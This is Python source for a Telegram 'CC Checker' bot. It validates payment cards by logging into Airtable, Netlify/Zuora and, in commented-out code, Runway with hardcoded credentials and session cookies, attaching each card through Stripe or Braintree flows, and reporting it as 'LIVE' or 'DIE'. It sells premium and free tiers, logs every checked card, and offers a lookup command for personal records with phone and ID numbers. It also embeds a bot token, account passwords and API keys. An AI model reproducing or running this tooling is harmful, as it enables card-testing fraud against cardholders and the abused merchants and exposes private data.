import os
import requests, json
import time
import string
import random
import asyncio
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from datetime import datetime
import pytz

#
#
#
premium = ['888464923', '5535605373', '1728762162', '329416283', '1871401156','5568817194']
#---
#1: work
#2: not work
#---
available_free = [2,1,2]#---[stripe, braintree, thông tin lớp]---
available_premium = [1,1,2]#---[stripe, braintree, thông tin lớp]---
#
#
#
def fil_data(data):
  use_data = data.split('|')
  cc = use_data[0]
  month = use_data[1]
  year = use_data[2]
  ccv = use_data[3]
  return cc, month, year, ccv
#
#
#
def time_log():
  tz_Ho_Chi_Minh = pytz.timezone('Asia/Ho_Chi_Minh')
  datetime_Ho_Chi_Minh = datetime.now(tz_Ho_Chi_Minh)
  time_log = ('\nChecked time: '+datetime_Ho_Chi_Minh.strftime("%d/%m/%Y - %H:%M:%S"))
  return time_log
#
#
#
def fileter(string, l, r):
  string = ((string[string.find(l):])[:(string[string.find(l):]).find(r)]).replace(l, '')
  return string
def data_vaild(data):
  vaild = 0
  if '' == data:
    vaild = -1
  else:
    use_data = data.split('|')
    if len(use_data) != 4:
      vaild = -1
    cc = use_data[0]
    if len(cc) != 16 and len(cc) != 15:
      vaild = -1
    month = use_data[1]
    if len(month) != 2:
      vaild = -1
    year = use_data[2]
    if len(year) != 4:
      vaild = -1
    ccv = use_data[3]
    if len(ccv) != 3:
      vaild = -1
    try:
      a = int(cc)
      b = int(month)
      c = int(year)
      d = int(ccv)
      if cc[0] != '4' and cc[0] != '5':
        vaild = -2
    except:
      vaild = -1
  return vaild
#
#
#
def gen_address():
  ran_num = random.randint(1000,10000)
  address = requests.get(f'https://api.nowtv.com/po/addresses?countryCode=US&searchAll={ran_num}').json()['data'][1] 
  street = address['addressFields']['houseNumber']+' '+address['addressFields']['street']
  city = address['addressFields']['town']
  state = address['addressFields']['county']
  postcode = address['addressFields']['postcode'].split('-')[0]
  return street, city, state, postcode
#
#
#
def gen_info():
  info = requests.get('https://random-data-api.com/api/users/random_user').json()
  #for x in info['results']:
    #first = x['name']['first']
    #last = x['name']['last']
  first = info['first_name']
  last = info['last_name']
  return first, last  
#
#
#
def findstr(string, l, r):
  string = (string[string.find(l)+len(l):])
  string = string[:string.find(r)]
  return string
def stripe_auth(data):
  cc, month, year, ccv = fil_data(data)
  try:
    headers_1 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Host': 'airtable.com','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-site','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}
    req_1 = requests.get('https://airtable.com/login', headers=headers_1)
    crsf = findstr(req_1.text, 'name="_csrf" value="', '"')
    session = findstr(str(req_1.cookies), '__Host-airtable-session=', ' for')
    session_seg = findstr(str(req_1.cookies), '__Host-airtable-session.sig=', ' for')
    headers_2 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'airtable.com','Origin': 'https','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    data_2 = {'_csrf': crsf, 'email': 'pfire6576@gmail.com', 'password': 'CC_king20'}
    req_2 = requests.post('https://airtable.com/auth/login/', data=data_2, headers=headers_2)
    session = findstr(str(req_2.cookies), '__Host-airtable-session=', ' for')
    session_seg = findstr(str(req_2.cookies), '__Host-airtable-session.sig=', ' for')
    headers_3 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Host': 'airtable.com','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    req_3 = requests.get('https://airtable.com/wspEYOZSwg6opeLEC/workspace/billing', headers=headers_3)
    sci = findstr(req_3.text, '"secretSocketId":"', '"')
    client_code = findstr(req_3.text, "release: '", "',")
    get_id = requests.post('https://m.stripe.com/6').json()
    muid = get_id['muid']
    guid = get_id['guid']
    sid = get_id['sid']
    headers_4 = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https','referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}
    data_4 = {
      'card[name]': 'Baldovino Eugene Durd',
      'card[number]': cc,
      'card[cvc]': ccv,
      'card[exp_month]': month,
      'card[exp_year]': year,
      'card[address_zip]': '10080',
      'email': 'pfire6576@gmail.com',
      'guid': guid,
      'muid': muid,
      'sid': sid,
      'payment_user_agent': 'stripe.js/0049b1d11; stripe-js-v3/0049b1d11',
      'time_on_page': random.randint(1000,5000000),
      'key': 'pk_be40LalrqNyovrhYTMlclChgOLW2H',
      'pasted_fields': 'number'}
    req_4 = requests.post('https://api.stripe.com/v1/tokens', data=data_4, headers=headers_4).json()
    token = req_4['id']
    headers_5 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'airtable.com','Origin': 'https','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','x-airtable-inter-service-client': 'webClient','x-airtable-inter-service-client-code-version': client_code,'x-requested-with': 'XMLHttpRequest', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    data_5 = {
      "stripeToken":token,
      "source":"workspaceSettings",
      "secretSocketId":sci}
    req_5 = requests.post('https://airtable.com/v0.3/wspEYOZSwg6opeLEC/workspace/updateCard', json=data_5, headers=headers_5)
    if 'cvc_check' in req_5.text:
      result = req_5.json()['stripeCard']['cvc_check']
      if result == 'pass':
        msg = f'''✅ <b>STRIPE AUTH LIVE CCV</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Set up the payment method successfully. [cvc_check: pass]'''
      elif result == 'fail':
        msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect. [cvc_check: fail]'''
      elif result == 'unavailable':
        msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>:  Can't check CVC. [cvc_check: {result}]'''
      else:
        msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
  <b>Card</b>: <code>{data}</code>
  <b>Message</b>: Unknown Response'''
    elif 'error' in req_5.text:
      mes = req_5.json()['error']['message']
      if mes == "Your card's security code is incorrect.":
        msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect.'''
      else:
        msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>: {mes}'''
    else:
      msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  except:
    msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  return msg
#
#
#
def braintree_auth(data):
  cc, month, year, ccv = fil_data(data)
  try:
    first, last = gen_info()
    street, city, state, postcode = gen_address()
    data_1 = {}
    headers_1 = {
      'accept': '*/*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9',
      'content-length': '0',
      'content-type': 'application/json',
      'origin': 'https://app.netlify.com',
      'referer': 'https://app.netlify.com/teams/hichilyn4/billing/general',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
      'cookie': '_gcl_au=1.1.336042288.1669474725; _current_page=www.netlify.com/; _lead_source=Marketing Unknown; _initial_referrer=(Direct); _initial_landing_page=https://www.netlify.com/; _ga=GA1.2.2075412487.1669474725; ajs_anonymous_id=430f9972-440c-4cd9-9074-c8911bd8d1a7; hubspotutk=e46e47e549886cb8a988e4219cd74fee; _previous_page=www.netlify.com/; _recent_lead_source=Organic Search; _hjSessionUser_3123140=eyJpZCI6ImFjYjczYTkyLWY3N2YtNTViMS04OWNmLTA0MjM3YTUxMTU4ZCIsImNyZWF0ZWQiOjE2Njk0NzQ3MjUxNDksImV4aXN0aW5nIjp0cnVlfQ==; __ssid=3318772506e2a5633805ac96c526536; _gid=GA1.2.63071752.1672657596; __hstc=7523757.e46e47e549886cb8a988e4219cd74fee.1669474727585.1671341994122.1672657596754.3; __hssrc=1; amp_cebfd0=XWnnxd07LXWrYPn_qb0w5I...1glp2iql8.1glp2kbtv.0.0.0; __hssc=7523757.2.1672657596754; _nf-auth=eoeq8JB00C2Nsuiw4ieazpry76IuOc1geNHB_Ds2CTc; _nf-auth-hint=user-is-likely-authed; ajs_user_id=63b2baeedadcbd518d941561; _bitballoon_session=K7XceQrIl4tK6QdX2OJIA5XhsOqBREvlOJYGYdUwQZrM%2Fs4ReaOi8SUmw3wZdjMngIKpabE%2BYrpOELrHpOU%2B%2BXP4DfeiR0sgM9%2BzubZkxCrmrhrSZpc9Nf6db5ZHfTOKq7Rm8s9XGQTh3g1AwpR4Z0KufeYtHrsTXeFZllFMpNPJmOhvT6RLf0VZZQ%3D%3D--9aUyngL0slvZgc1e--bW6PaQZwCjQ9HyDM396mMQ%3D%3D; _dc_gtm_UA-42258181-4=1; _dd_s=rum=1&id=fc5edbf5-ffa8-4c10-bca5-c1abc34a79ef&created=1672657595058&expire=1672658689373'
    }
    req_1 = requests.post('https://app.netlify.com/access-control/bb-api/api/v1/billing/client_token?sandbox=0&legacy=0&account_id=63b2baeedadcbd518d941562', json=data_1, headers=headers_1).json()
    token = req_1['token']
    signature = req_1['signature']
    payment_gateway_id = req_1['payment_gateway_id']
    month = str(int(month))
    if cc[0] == '4':
      type = 'Visa'
    elif cc[0] == '5':
      type = 'MasterCard'
    data_2 = {
      "accountKey": payment_gateway_id,
      "cardHolderInfo": {
        "cardHolderName": f'{first} {last}',
        "addressLine1": street,
        "addressLine2": "",
        "city": city,
        "country": "US",
        "state": state,
        "zipCode": postcode
      },
      "creditCardNumber": cc,
      "creditCardType": type,
      "defaultPaymentMethod": 'true',
      "expirationMonth": month,
      "expirationYear": year,
      "securityCode": ccv,
    }
    headers_2 = {
      'Accept': 'application/json',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'vi-VN,vi;q=0.9',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json',
      'Host': 'rest.zuora.com',
      'Origin': 'https://app.netlify.com',
      'Referer': 'https://app.netlify.com/teams/hichilyn4/billing/general',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'signature': signature,
      'token': token,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    }
    req_2 = requests.post('https://rest.zuora.com/v1/payment-methods/credit-cards', json= data_2, headers= headers_2).json()
    if "True" in str(req_2) or 'Gateway Rejected: avs' in str(req_2):
      msg = f'''✅ <b>BRAINTREE AUTH LIVE</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Set up the payment method successfully.'''
    else:
      for x in req_2['reasons']:
        error = x['message']+'@'
      error = fileter(str(error), '- ', '@')
      msg = f'''❌ <b>BRAINTREE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Transaction declined. [{error}]'''
  except:
    msg = f'''⚠️ <b>BRAINTREE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  finally:
    return msg
#
#
#
def get_info(data):
  try:
    for i, line in enumerate(open('list.txt', encoding = 'utf-8')):
      find = line.replace('\n', '')
      find = find.split('|')
      
      if int(data) < 43 and find[0] == data:
        info = find
        if info[3] == 'Nữ':
          info[3] = 'Female'     
        else:
          info[3] = 'Male'     
        msg = f'''✅ <b>GET INFO DONE</b> ✅
<b>Name</b>: {info[1]}
<b>Birthday</b>: {info[2]}
<b>Gender</b>: {info[3]}
<b>Phone number</b>: {info[4]}
<b>ID No</b>: {info[5]}'''
        break
      else:
        msg = f'''❌ <b>GET INFO FAIL</b> ❌
<b>Message</b>: Data is not in my database.'''
  except:
    msg = f'''⚠️ <b>GET INFO WARNING</b> ⚠️
<b>Message</b>: Error occured.'''
  finally:
    return msg  
#
#
#
PREFIX = "!/"
TOKEN = '5200353658:AAElvyzqplaWwWm4UOwUIrJcKQo3gllTnmg'
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)
loop = asyncio.get_event_loop()
bot_info = loop.run_until_complete(bot.get_me())
#
#
#
@dp.message_handler(commands=['start','help'], commands_prefix=PREFIX)
async def hello(message: types.Message):
  await message.answer_chat_action("typing")
  await message.reply(f'CC Checker:\n/sa: CCV Stripe Auth\n/ba: CCV Braintree Auth\nFormat: xxxxxxxxxxxxxxxx|xx|xxxx|xxx\nSupport: Visa, MasterCard')  
#
#
#
@dp.message_handler(commands='sa', commands_prefix=PREFIX)
async def stripeauth(message: types.Message):
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  LAST = message.from_user.last_name
  if FIRST == None:
    FIRST = ''
  if LAST == None:
    LAST = ''
  if ID == 1989894564:
    end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
<b>Bot</b>: @{bot_info.username}'''
  elif str(ID) in premium:
    if available_premium[0] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Premium]
<b>Bot</b>: @{bot_info.username}'''
    elif available_premium[0] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  else:
    if available_free[0] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Free User]
<b>Bot</b>: @{bot_info.username}'''
    elif available_free[0] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  data = str(message.text).replace('/sa', '')
  data = data.replace(' ', '')
  await message.answer_chat_action("typing")
  vaild = data_vaild(data)
  if vaild == 0:
    first_time = time.time()
    msg = stripe_auth(data)
    taken_time = round((time.time()-first_time),2)
    with open('log.txt', 'a') as f:
      checked_time = time_log()
      f.write(msg+checked_time+'\n-----------------------\n')
    await message.reply(f'{msg}\n<b>Time</b>: {taken_time}s\n{end}')
  elif vaild == -1:
    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
<b>Message</b>: Invalid format
{end}''')
  elif vaild == -2:
    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
<b>Message</b>: Unsupported Card Type
{end}''')
#
#
#
@dp.message_handler(commands='ba', commands_prefix=PREFIX)
async def braintreeauth(message: types.Message):
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  LAST = message.from_user.last_name
  if FIRST == None:
    FIRST = ''
  if LAST == None:
    LAST = ''
  if ID == 1989894564:
    end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
<b>Bot</b>: @{bot_info.username}'''
  elif str(ID) in premium:
    if available_premium[1] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Premium]
<b>Bot</b>: @{bot_info.username}'''
    elif available_premium[1] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  else:
    if available_free[1] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Free User]
<b>Bot</b>: @{bot_info.username}'''
    elif available_free[1] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  data = str(message.text).replace('/ba', '')
  data = data.replace(' ', '')
  await message.answer_chat_action("typing")
  vaild = data_vaild(data)
  if vaild == 0:
    first_time = time.time()
    msg = braintree_auth(data)
    taken_time = round((time.time()-first_time),2)
    with open('log.txt', 'a') as f:
      checked_time = time_log()
      f.write(msg+checked_time+'\n-----------------------\n')
    await message.reply(f'{msg}\n<b>Time</b>: {taken_time}s\n{end}')
  elif vaild == -1:
    await message.reply(f'''⚠️ <b>BRAINTREE AUTH WARNING</b> ⚠️
<b>Message</b>: Invalid format
{end}''')
  elif vaild == -2:
    await message.reply(f'''⚠️ <b>BRAINTREE AUTH WARNING</b> ⚠️
<b>Message</b>: Unsupported Card Type
{end}''')
@dp.message_handler(commands='gi', commands_prefix=PREFIX)
async def getid(message: types.Message):
  ID = message.from_user.id
  await message.reply(f'''✅ <b>COMPLETE</b> ✅
<b>Your id</b>: <code>{ID}</code>''')
#
#
#
@dp.message_handler(commands='gin', commands_prefix=PREFIX)
async def getinfo(message: types.Message):
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  LAST = message.from_user.last_name
  if FIRST == None:
    FIRST = ''
  if LAST == None:
    LAST = ''
  if ID == 1989894564:
    end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
<b>Bot</b>: @{bot_info.username}'''
  elif str(ID) in premium:
    if available_premium[2] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Premium]
<b>Bot</b>: @{bot_info.username}'''
    elif available_premium[2] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  else:
    if available_free[2] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Free User]
<b>Bot</b>: @{bot_info.username}'''
    elif available_free[2] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  data = str(message.text).replace('/gin', '')
  data = data.replace(' ', '')
  await message.answer_chat_action("typing")
  first_time = time.time()
  msg = get_info(data)
  taken_time = round((time.time()-first_time),2)
  await message.reply(f'{msg}\n<b>Time</b>: {taken_time}s\n{end}')
#
#
#
if __name__ == '__main__':
  executor.start_polling(dp, skip_updates=True, loop=loop)


"""@dp.message_handler(commands='sa', commands_prefix=PREFIX)
async def stripeauth(message: types.Message):
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  LAST = message.from_user.last_name
  if FIRST == None:
    FIRST = ''
  if LAST == None:
    LAST = ''
  if ID == 1989894564:
    end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
<b>Bot</b>: @{bot_info.username}'''
  elif str(ID) in premium:
    if available_premium[0] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Premium]
<b>Bot</b>: @{bot_info.username}'''
    elif available_premium[0] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  else:
    if available_free[0] == 1:
      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Free User]
<b>Bot</b>: @{bot_info.username}'''
    elif available_free[0] == 2:
      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
<b>Message</b>: You can't access to this command.''')
      return
  data = str(message.text).replace('/sa', '')
  data = data.replace(' ', '')
  await message.answer_chat_action("typing")
  vaild = data_vaild(data)
  if vaild == 0:
    first_time = time.time()
    msg = 'UnauthorizedError: The token has been revoked.'
    while 'The token has been revoked.' in msg:
      msg = stripe_auth(data)
    taken_time = round((time.time()-first_time),2)
    with open('log.txt', 'a') as f:
      checked_time = time_log()
      f.write(msg+checked_time+'\n-----------------------\n')
    await message.reply(f'{msg}\n<b>Time</b>: {taken_time}s\n{end}')
  elif vaild == -1:
    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
<b>Message</b>: Invalid format
{end}''')
  elif vaild == -2:
    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
<b>Message</b>: Unsupported Card Type
{end}''')"""

"""def stripe_auth(data):
  cc, month, year, ccv = fil_data(data)
  try:
    #data_0 = {"username":"nooby122","password":"CC_king20","machineId":null}
    
    #req_0 = requests.post('https://api.runwayml.com/v1/login', json = data_0, headers = headers_0)
    tk = requests.get('https://support.relaxchannel.repl.co/api/token').json()['token']
    first, last = gen_info()
    name = f'{first} {last}'
    get_id = requests.post('https://m.stripe.com/6').json()
    muid = get_id['muid']
    guid = get_id['guid']
    sid = get_id['sid']
    data_1 = {
      'card[name]': name,
      'card[number]': cc,
      'card[cvc]': ccv,
      'card[exp_month]': month,
      'card[exp_year]': year,
      'guid': guid,
      'muid': muid,
      'sid': sid,
      'payment_user_agent': 'stripe.js/a6f64a353; stripe-js-v3/a6f64a353',
      'key': 'pk_live_CGs0xz5CvWKEDSS0WYsxE7or',
      'pasted_fields': 'number'
    }
    headers_1 = {
      'accept': 'application/json',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7', 
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://js.stripe.com',
      'referer': 'https://js.stripe.com/',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    }
    req_1 = requests.post('https://api.stripe.com/v1/tokens', data = data_1, headers = headers_1)
    if 'id' in req_1.text:
      token = req_1.json()['id']
      data_2 = {
        "source": token,
      }
      headers_2 = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {tk}',
        'content-type': 'application/json',
        'origin': 'https://app.runwayml.com',
        'referer': 'https://app.runwayml.com/',
        'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76'
      }
      req_2 = requests.post('https://api.runwayml.com/v1/profile/add_stripe_card', json=data_2, headers = headers_2)
      #print(req_2.json())
      if 'cvc_check' in req_2.text:
        result = req_2.json()['card']['cvc_check']
        if result == 'pass':
          msg = f'''✅ <b>STRIPE AUTH LIVE CCV</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Set up the payment method successfully. [cvc_check: pass]'''
        elif result == 'fail':
          msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect. [cvc_check: fail]'''
        elif result == 'unavailable':
          msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>:  Can't check CVC. [cvc_check: {result}]'''
        else:
          msg = f'''✅ <b>STRIPE AUTH MAYBE LIVE</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>:  Uncheck CVC. [cvc_check: {result}]'''
        card_id = req_2.json()['card']['id']
        data_3 = {
          "cardID": card_id
        }
        headers_3 = {
          'accept': 'application/json',
          'accept-encoding': 'gzip, deflate, br',
          'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
          'authorization': f'Bearer {tk}',
          'content-type': 'application/json',
          'origin': 'https://app.runwayml.com',
          'referer': 'https://app.runwayml.com/',
          'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76'
        }
        req_3 = requests.post('https://api.runwayml.com/v1/profile/remove_stripe_card', json = data_3, headers = headers_3)
        if 'true' not in req_3.text:
          with open('check.txt', 'a') as f:
            f.write(f'Data: {data} [unremoved]')
      else:
        mes = req_2.json()['error']
        if mes == "Your card's security code is incorrect.":
          msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect.'''
        else:
          msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>: {mes}'''
    else:
      msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>: can't_create_payment_id'''
  except:
    msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  finally:
    return msg"""